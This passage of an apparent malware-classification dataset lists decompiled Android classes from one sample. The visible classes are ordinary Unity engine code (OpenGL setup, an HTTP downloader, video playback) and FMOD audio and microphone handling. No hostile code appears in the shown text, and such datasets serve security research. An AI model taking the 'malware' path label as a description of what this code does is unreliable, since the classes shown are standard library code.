eglGetDisplay=egl10.eglGetDisplay(EGL10.EGL_DEFAULT_DISPLAY);     if (eglGetDisplay == EGL10.EGL_NO_DISPLAY) {       throw new RuntimeException(""eglGetDisplay failed"");     }     if (egl10.eglInitialize(eglGetDisplay,new int[2])) {       return a(egl10,eglGetDisplay);     }     throw new RuntimeException(""eglInitialize failed"");   }   final v a(  EGL10 egl10,  EGLDisplay eGLDisplay){     int[] iArr=r[this.b];     int[] iArr2=new int[1];     egl10.eglChooseConfig(eGLDisplay,iArr,null,0,iArr2);     int i=iArr2[0];     if (i <= 0) {       throw new IllegalArgumentException(""No configs match configSpec"");     }     EGLConfig[] eGLConfigArr=new EGLConfig[i];     egl10.eglChooseConfig(eGLDisplay,iArr,eGLConfigArr,i,iArr2);     v a=a(egl10,eGLDisplay,eGLConfigArr);     while (a == null && this.n > 0) {       this.n=this.n == 2 ? 0 : this.n / 2;       a=a(egl10,eGLDisplay,eGLConfigArr);     }     if (a == null && this.l == 24) {       this.l=16;       a=a(egl10,eGLDisplay,eGLConfigArr);     }     if (a == null && this.g) {       this.g=false;       this.h=5;       this.i=6;       this.j=5;       this.k=0;       a=a(egl10,eGLDisplay,eGLConfigArr);     }     return a == null ? new v(egl10,eGLDisplay,eGLConfigArr[0]) : a;   }   public final boolean a(){     return this.g;   }   public final boolean a(  int i){     if (this.f == i || this.n == i) {       return false;     }     a(this.c,this.d,this.e,i);     return true;   }   public final boolean a(  boolean z){     boolean z2=z && b();     if (this.c == z2 || this.g == z2) {       return false;     }     a(z2,this.d,this.e,this.f);     return true;   }   public String toString(){     return ""EGLConfigChooser\n\nRequested:\nmReqGlesVersion: "" + this.b + ""\nmReq32bit: ""+ this.c+ ""\nmReqDepthSize: ""+ this.d+ ""\nmReqStencilSize: ""+ this.e+ ""\nmReqAALevel: ""+ this.f+ ""\n\nActual\nm32bit: ""+ this.g+ ""\nmRedSize: ""+ this.h+ ""\nmGreenSize: ""+ this.i+ ""\nmBlueSize: ""+ this.j+ ""\nmAlphaSize: ""+ this.k+ ""\nmDepthSize: ""+ this.l+ ""\nmStencilSize: ""+ this.m+ ""\nmAALevel: ""+ this.n+ ""\n\nSelect default configuration: \n""+ this.o;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\WWW.code","class WWW extends Thread {   private int a=0;   private int b;   private String c;   private byte[] d;   private Map e;   WWW(  int i,  String str,  byte[] bArr,  Map map){     this.b=i;     this.c=str;     this.d=bArr;     this.e=map;     start();   }   private static native void doneCallback(  int i);   private static native void errorCallback(  int i,  String str);   private static native boolean headerCallback(  int i,  String str);   private static native void progressCallback(  int i,  float f,  float f2,  double d,  int i2);   private static native boolean readCallback(  int i,  byte[] bArr,  int i2);   protected boolean headerCallback(  String str,  String str2){     return headerCallback(this.b,str + "": "" + str2+ ""\n\r"");   }   protected boolean headerCallback(  Map map){     if (map == null || map.size() == 0) {       return false;     }     StringBuilder sb=new StringBuilder();     for (    Map.Entry entry : map.entrySet()) {       for (      String str : (List)entry.getValue()) {         sb.append((String)entry.getKey());         sb.append("": "");         sb.append(str);         sb.append(""\n\r"");       }     }     return headerCallback(this.b,sb.toString());   }   protected void progressCallback(  int i,  int i2,  int i3,  int i4,  long j,  long j2){     float f;     float f2;     double d;     if (i4 > 0) {       f=i3 / i4;       double max=Math.max(i4 - i3,0) / ((1000.0d * i3) / Math.max(j - j2,0.1d));       if (Double.isInfinite(max) || Double.isNaN(max)) {         max=0.0d;       }       f2=1.0f;       d=max;     }  else {       if (i2 <= 0) {         return;       }       f=0.0f;       f2=i / i2;       d=0.0d;     }     progressCallback(this.b,f2,f,d,i4);   }   protected boolean readCallback(  byte[] bArr,  int i){     return readCallback(this.b,bArr,i);   }   @Override public void run(){     List<String> list;     int i=this.a + 1;     this.a=i;     if (i > 5) {       errorCallback(this.b,""Too many redirects"");       return;     }     try {       URL url=new URL(this.c);       URLConnection openConnection=url.openConnection();       if (url.getProtocol().equalsIgnoreCase(""file"") && url.getHost() != null && url.getHost().length() != 0) {         errorCallback(this.b,url.getHost() + url.getFile() + "" is not an absolute path!"");         return;       }       if (this.e != null) {         for (        Map.Entry entry : this.e.entrySet()) {           openConnection.addRequestProperty((String)entry.getKey(),(String)entry.getValue());         }       }       if (this.d != null) {         openConnection.setDoOutput(true);         try {           OutputStream outputStream=openConnection.getOutputStream();           int i2=0;           while (i2 < this.d.length) {             int min=Math.min(1428,this.d.length - i2);             outputStream.write(this.d,i2,min);             i2+=min;             progressCallback(i2,this.d.length,0,0,0L,0L);           }         }  catch (        Exception e) {           errorCallback(this.b,e.toString());           return;         }       }       if (openConnection instanceof HttpURLConnection) {         HttpURLConnection httpURLConnection=(HttpURLConnection)openConnection;         try {           int responseCode=httpURLConnection.getResponseCode();           Map<String,List<String>> headerFields=httpURLConnection.getHeaderFields();           if (headerFields != null && ((responseCode == 301 || responseCode == 302) && (list=headerFields.get(""Location"")) != null && !list.isEmpty())) {             httpURLConnection.disconnect();             this.c=list.get(0);             run();             return;           }         }  catch (        IOException e2) {           errorCallback(this.b,e2.toString());           return;         }       }       Map<String,List<String>> headerFields2=openConnection.getHeaderFields();       boolean headerCallback=headerCallback(headerFields2);       if ((headerFields2 == null || !headerFields2.containsKey(""content-length"")) && openConnection.getContentLength() != -1) {         headerCallback=headerCallback || headerCallback(""content-length"",String.valueOf(openConnection.getContentLength()));       }       if ((headerFields2 == null || !headerFields2.containsKey(""content-type"")) && openConnection.getContentType() != null) {         headerCallback=headerCallback || headerCallback(""content-type"",openConnection.getContentType());       }       if (headerCallback) {         errorCallback(this.b,this.c + "" aborted"");         return;       }       int contentLength=openConnection.getContentLength() > 0 ? openConnection.getContentLength() : 0;       int min2=(url.getProtocol().equalsIgnoreCase(""file"") || url.getProtocol().equalsIgnoreCase(""jar"")) ? contentLength == 0 ? 32768 : Math.min(contentLength,32768) : 1428;       int i3=0;       try {         long currentTimeMillis=System.currentTimeMillis();         byte[] bArr=new byte[min2];         InputStream inputStream=openConnection.getInputStream();         for (int i4=0; i4 != -1; i4=inputStream.read(bArr)) {           if (readCallback(bArr,i4)) {             errorCallback(this.b,this.c + "" aborted"");             return;           }  else {             i3+=i4;             progressCallback(0,0,i3,contentLength,System.currentTimeMillis(),currentTimeMillis);           }         }         progressCallback(0,0,i3,i3,0L,0L);         doneCallback(this.b);       }  catch (      Exception e3) {         errorCallback(this.b,e3.toString());       }     }  catch (    MalformedURLException e4) {       errorCallback(this.b,e4.toString());     } catch (    IOException e5) {       errorCallback(this.b,e5.toString());     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\x.code","class x extends GLSurfaceView implements UnityGL {   private static boolean a=false;   private static boolean b;   private w c;   private boolean d; static class a implements GLSurfaceView.EGLContextFactory {     private a(){     }     a(    byte b){       this();     }     @Override public final EGLContext createContext(    EGL10 egl10,    EGLDisplay eGLDisplay,    EGLConfig eGLConfig){       x.b(""Creating OpenGL ES "" + (x.b ? ""2.0"" : ""1.x"") + "" context (""+ new v(egl10,eGLDisplay,eGLConfig).a()+ "")"");       x.b(""Before eglCreateContext"",egl10);       int[] iArr=new int[3];       iArr[0]=12440;       iArr[1]=x.b ? 2 : 1;       iArr[2]=12344;       EGLContext eglCreateContext=egl10.eglCreateContext(eGLDisplay,eGLConfig,EGL10.EGL_NO_CONTEXT,iArr);       x.b(""After eglCreateContext"",egl10);       return eglCreateContext;     }     @Override public final void destroyContext(    EGL10 egl10,    EGLDisplay eGLDisplay,    EGLContext eGLContext){       egl10.eglDestroyContext(eGLDisplay,eGLContext);     }   }   public x(  Context context,  int i,  boolean z,  boolean z2,  boolean z3,  int i2,  int i3,  int i4){     super(context);     byte b2=0;     this.c=null;     this.d=false;     a=z2;     b=i == 2;     this.d=z;     setEGLContextFactory(new a(b2));     this.c=new w(z3,i2,0,i4,i);     setEGLConfigChooser(this.c.a);     b();   }   public static void b(  String str){     if (a) {       return;     }     Log.d(""Unity"",str);   }   public static void b(  String str,  EGL10 egl10){     for (int i=0; i < 2; i++) {       int eglGetError=egl10.eglGetError();       if (eglGetError == 12288) {         return;       }       Log.e(""Unity"",String.format(""%s: EGL error: 0x%x"",str,Integer.valueOf(eglGetError)));     }   }   @Override public final void a(){     super.onDetachedFromWindow();   }   public final boolean a(  boolean z,  int i){     return this.c.a(z) | false | this.c.a(i);   }   public final void b(){     int i=this.d ? -3 : -1;     if (this.c.a()) {       i=this.d ? 1 : 2;     }     getHolder().setFormat(i);   }   @Override protected void onDetachedFromWindow(){     b(""onDetachedFromWindow"");   }   @Override public boolean onGenericMotionEvent(  MotionEvent motionEvent){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\y.code","public final class y {   private static boolean a=false;   private boolean b=false;   private boolean c=false;   private boolean d=false;   private boolean e=false;   private boolean f=false;   private boolean g=true;   public static void a(){     a=true;   }   public static boolean b(){     return a;   }   public final void a(  boolean z){     this.c=z;   }   public final void b(  boolean z){     this.g=z;   }   public final void c(){     this.b=true;   }   public final void c(  boolean z){     this.d=z;   }   public final void d(){     this.e=true;   }   public final void e(){     this.f=true;   }   public final boolean f(){     return a && this.c && this.b&& !this.g&& !this.d;   }   public final boolean g(){     return this.d;   }   public final boolean h(){     return this.e;   }   public final boolean i(){     return this.f;   }   public final String toString(){     return super.toString();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\z.code","public final class z extends FrameLayout implements SensorEventListener, MediaPlayer.OnBufferingUpdateListener, MediaPlayer.OnCompletionListener, MediaPlayer.OnPreparedListener, MediaPlayer.OnVideoSizeChangedListener, SurfaceHolder.Callback, MediaController.MediaPlayerControl {   private final UnityPlayer a;   private final Context b;   private final SurfaceView c;   private final SurfaceHolder d;   private final String e;   private final int f;   private final int g;   private final boolean h;   private final long i;   private final long j;   private final FrameLayout k;   private final SensorManager l;   private final WindowManager m;   private int n;   private int o;   private int p;   private int q;   private MediaPlayer r;   private MediaController s;   private boolean t;   private boolean u;   private int v;   private boolean w;   private int x;   private boolean y;   public z(  UnityPlayer unityPlayer,  Context context,  String str,  int i,  int i2,  int i3,  boolean z,  long j,  long j2){     super(context);     this.t=false;     this.u=false;     this.v=0;     this.w=false;     this.x=0;     this.a=unityPlayer;     this.b=context;     this.k=this;     this.c=new SurfaceView(context);     this.d=this.c.getHolder();     this.d.addCallback(this);     this.d.setType(3);     this.k.setBackgroundColor(i);     this.k.addView(this.c);     this.l=(SensorManager)this.b.getSystemService(""sensor"");     this.m=(WindowManager)this.b.getSystemService(""window"");     this.e=str;     this.f=i2;     this.g=i3;     this.h=z;     this.i=j;     this.j=j2;     setFocusable(true);     setFocusableInTouchMode(true);     this.l.registerListener(this,this.l.getDefaultSensor(1),1);     this.y=true;   }   private void a(){     doCleanUp();     try {       this.r=new MediaPlayer();       if (this.h) {         this.r.setDataSource(this.b,Uri.parse(this.e));       }  else       if (this.j != 0) {         FileInputStream fileInputStream=new FileInputStream(this.e);         this.r.setDataSource(fileInputStream.getFD(),this.i,this.j);         fileInputStream.close();       }  else {         try {           AssetFileDescriptor openFd=getResources().getAssets().openFd(this.e);           this.r.setDataSource(openFd.getFileDescriptor(),openFd.getStartOffset(),openFd.getLength());           openFd.close();         }  catch (        IOException e) {           FileInputStream fileInputStream2=new FileInputStream(this.e);           this.r.setDataSource(fileInputStream2.getFD());           fileInputStream2.close();         }       }       this.r.setDisplay(this.d);       this.r.setOnBufferingUpdateListener(this);       this.r.setOnCompletionListener(this);       this.r.setOnPreparedListener(this);       this.r.setOnVideoSizeChangedListener(this);       this.r.setAudioStreamType(3);       this.r.prepare();       if (this.f == 0 || this.f == 1) {         this.s=new MediaController(this.b);         this.s.setMediaPlayer(this);         this.s.setAnchorView(this.c);         this.s.setEnabled(true);         this.s.show();       }     }  catch (    Exception e2) {       onDestroy();     }   }   private void b(){     if (isPlaying()) {       return;     }     updateVideoLayout();     if (this.w) {       return;     }     start();   }   @Override public final boolean canPause(){     return true;   }   @Override public final boolean canSeekBackward(){     return true;   }   @Override public final boolean canSeekForward(){     return true;   }   protected final void doCleanUp(){     if (this.r != null) {       this.r.release();       this.r=null;     }     this.p=0;     this.q=0;     this.u=false;     this.t=false;   }   @Override public final int getBufferPercentage(){     if (this.h) {       return this.v;     }     return 100;   }   @Override public final int getCurrentPosition(){     if (this.r == null) {       return 0;     }     return this.r.getCurrentPosition();   }   @Override public final int getDuration(){     if (this.r == null) {       return 0;     }     return this.r.getDuration();   }   @Override public final boolean isPlaying(){     boolean z=this.u && this.t;     return this.r == null ? !z : this.r.isPlaying() || !z;   }   @Override public final void onAccuracyChanged(  Sensor sensor,  int i){   }   @Override public final void onBufferingUpdate(  MediaPlayer mediaPlayer,  int i){     this.v=i;   }   @Override public final void onCompletion(  MediaPlayer mediaPlayer){     onDestroy();   }   protected final void onDestroy(){     onPause();     doCleanUp();     UnityPlayer unityPlayer=this.a;     UnityPlayer.a(new Runnable(){       @Override public final void run(){         z.this.a.hideVideoPlayer();       }     } );   }   @Override public final boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i != 4 && (this.f != 2 || i == 0 || keyEvent.isSystem())) {       return this.s != null ? this.s.onKeyDown(i,keyEvent) : super.onKeyDown(i,keyEvent);     }     onDestroy();     return true;   }   public final void onPause(){     this.l.unregisterListener(this);     if (!this.w) {       pause();       this.w=false;     }     if (this.r != null) {       this.x=this.r.getCurrentPosition();     }     this.y=false;   }   @Override public final void onPrepared(  MediaPlayer mediaPlayer){     this.u=true;     if (this.u && this.t) {       b();     }   }   public final void onResume(){     if (!this.y) {       this.l.registerListener(this,this.l.getDefaultSensor(1),1);       if (!this.w) {         start();       }     }     this.y=true;   }   @Override public final void onSensorChanged(  SensorEvent sensorEvent){     if (sensorEvent.sensor.getType() == 1) {       this.a.nativeDeviceOrientation(s.a(sensorEvent,this.m.getDefaultDisplay().getOrientation(),this.a.getOrientation()));     }   }   @Override public final boolean onTouchEvent(  MotionEvent motionEvent){     int action=motionEvent.getAction() & MotionEventCompat.ACTION_MASK;     if (this.f != 2 || action != 0) {       return this.s != null ? this.s.onTouchEvent(motionEvent) : super.onTouchEvent(motionEvent);     }     onDestroy();     return true;   }   @Override public final void onVideoSizeChanged(  MediaPlayer mediaPlayer,  int i,  int i2){     if (i == 0 || i2 == 0) {       return;     }     this.t=true;     this.p=i;     this.q=i2;     if (this.u && this.t) {       b();     }   }   @Override public final void pause(){     if (this.r == null) {       return;     }     this.r.pause();     this.w=true;   }   @Override public final void seekTo(  int i){     if (this.r == null) {       return;     }     this.r.seekTo(i);   }   @Override public final void start(){     if (this.r == null) {       return;     }     this.r.start();     this.w=false;   }   @Override public final void surfaceChanged(  SurfaceHolder surfaceHolder,  int i,  int i2,  int i3){     this.n=i2;     this.o=i3;   }   @Override public final void surfaceCreated(  SurfaceHolder surfaceHolder){     a();     seekTo(this.x);   }   @Override public final void surfaceDestroyed(  SurfaceHolder surfaceHolder){     doCleanUp();   }   public final void updateVideoLayout(){     WindowManager windowManager=(WindowManager)this.b.getSystemService(""window"");     this.n=windowManager.getDefaultDisplay().getWidth();     this.o=windowManager.getDefaultDisplay().getHeight();     int i=this.n;     int i2=this.o;     if (this.g == 1 || this.g == 2) {       float f=this.p / this.q;       if (this.n / this.o <= f) {         i2=(int)(this.n / f);       }  else {         i=(int)(this.o * f);       }     }  else     if (this.g == 0) {       i=this.p;       i2=this.q;     }     this.k.updateViewLayout(this.c,new FrameLayout.LayoutParams(i,i2,17));   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\org.fmod\a.code","public final class a implements Runnable {   private final FMODAudioDevice a;   private final ByteBuffer b;   private final int c;   private final int d;   private final int e=2;   private volatile Thread f;   private volatile boolean g;   private AudioRecord h;   private boolean i;   public a(  FMODAudioDevice fMODAudioDevice,  int i,  int i2){     this.a=fMODAudioDevice;     this.c=i;     this.d=i2;     this.b=ByteBuffer.allocateDirect(AudioRecord.getMinBufferSize(i,i2,2));   }   private void d(){     if (this.h != null) {       if (this.h.getState() == 1) {         this.h.stop();       }       this.h.release();       this.h=null;     }     this.b.position(0);     this.i=false;   }   public final int a(){     return this.b.capacity();   }   public final void b(){     if (this.f != null) {       c();     }     this.g=true;     this.f=new Thread(this);     this.f.start();   }   public final void c(){     while (this.f != null) {       this.g=false;       try {         this.f.join();         this.f=null;       }  catch (      InterruptedException e) {       }     }   }   @Override public final void run(){     int i;     int i2=3;     while (this.g) {       if (this.a.isInitialized()) {         if (!this.i && i2 > 0) {           d();           this.h=new AudioRecord(1,this.c,this.d,2,this.b.capacity());           this.i=this.h.getState() == 1;           if (this.i) {             this.b.position(0);             this.h.startRecording();             i=3;             if (this.i || this.h.getRecordingState() != 3) {               i2=i;             }  else {               this.a.fmodProcessMicData(this.b,this.h.read(this.b,this.b.capacity()));               this.b.position(0);               i2=i;             }           }  else {             Log.e(""FMOD"",""AudioRecord failed to initialize (status "" + this.h.getState() + "")"");             i2--;             d();           }         }         i=i2;         if (this.i) {         }         i2=i;       }  else {         try {           Thread.sleep(10L);         }  catch (        InterruptedException e) {           this.g=false;         }       }     }     d();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\org.fmod\FMODAudioDevice.code","public class FMODAudioDevice implements Runnable {   private static int h=1;   private static int i=2;   private static int j=3;   private volatile Thread a=null;   private volatile boolean b=false;   private AudioTrack c=null;   private boolean d=false;   private ByteBuffer e=null;   private byte[] f=null;   private volatile a g;   private native int fmodGetInfo(  int i2);   private native int fmodInitJni();   private native int fmodProcess(  ByteBuffer byteBuffer);   private void releaseAudioTrack(){     if (this.c != null) {       if (this.c.getState() == 1) {         this.c.stop();       }       this.c.release();       this.c=null;     }     this.e=null;     this.f=null;     this.d=false;   }   public native int fmodProcessMicData(  ByteBuffer byteBuffer,  int i2);   public boolean isInitialized(){     return fmodGetInfo(0) > 0;   }   public boolean isRunning(){     return this.a != null && this.a.isAlive();   }   @Override public void run(){     int i2;     int i3=3;     while (this.b) {       if (isInitialized()) {         if (this.d || i3 <= 0) {           i2=i3;         }  else {           releaseAudioTrack();           int fmodGetInfo=fmodGetInfo(0);           int round=Math.round(AudioTrack.getMinBufferSize(fmodGetInfo,3,2) * 1.1f) & (-4);           int fmodGetInfo2=fmodGetInfo(h);           int fmodGetInfo3=fmodGetInfo(i);           if (fmodGetInfo2 * fmodGetInfo3 * 4 > round) {             round=fmodGetInfo3 * fmodGetInfo2 * 4;           }           this.c=new AudioTrack(3,fmodGetInfo,3,2,round,1);           this.d=this.c.getState() == 1;           if (this.d) {             this.e=ByteBuffer.allocateDirect(fmodGetInfo2 * 2 * 2);             this.f=new byte[this.e.capacity()];             this.c.play();             i2=3;           }  else {             Log.e(""FMOD"",""AudioTrack failed to initialize (status "" + this.c.getState() + "")"");             releaseAudioTrack();             i2=i3 - 1;           }         }         if (!this.d) {           i3=i2;         }  else         if (fmodGetInfo(j) == 1) {           fmodProcess(this.e);           this.e.get(this.f,0,this.e.capacity());           this.c.write(this.f,0,this.e.capacity());           this.e.position(0);           i3=i2;         }  else {           releaseAudioTrack();           i3=i2;         }       }  else {         try {           Thread.sleep(10L);         }  catch (        InterruptedException e) {           this.b=false;         }       }     }     releaseAudioTrack();   }   public synchronized void start(){     if (this.a != null) {       stop();     }     this.a=new Thread(this,""FMODAudioDevice"");     this.a.setPriority(10);     this.b=true;     fmodInitJni();     this.a.start();     if (this.g != null) {       this.g.b();     }   }   public synchronized int startAudioRecord(  int i2,  int i3,  int i4){     if (this.g == null) {       this.g=new a(this,i2,i3);       this.g.b();     }     return this.g.a();   }   public synchronized void stop(){     while (this.a != null) {       this.b=false;       try {         this.a.join();         this.a=null;       }  catch (      InterruptedException e) {       }     }     if (this.g != null) {       this.g.c();     }   }   public synchronized void stopAudioRecord(){     if (this.g != null) {       this.g.c();       this.g=null;     }   } } "
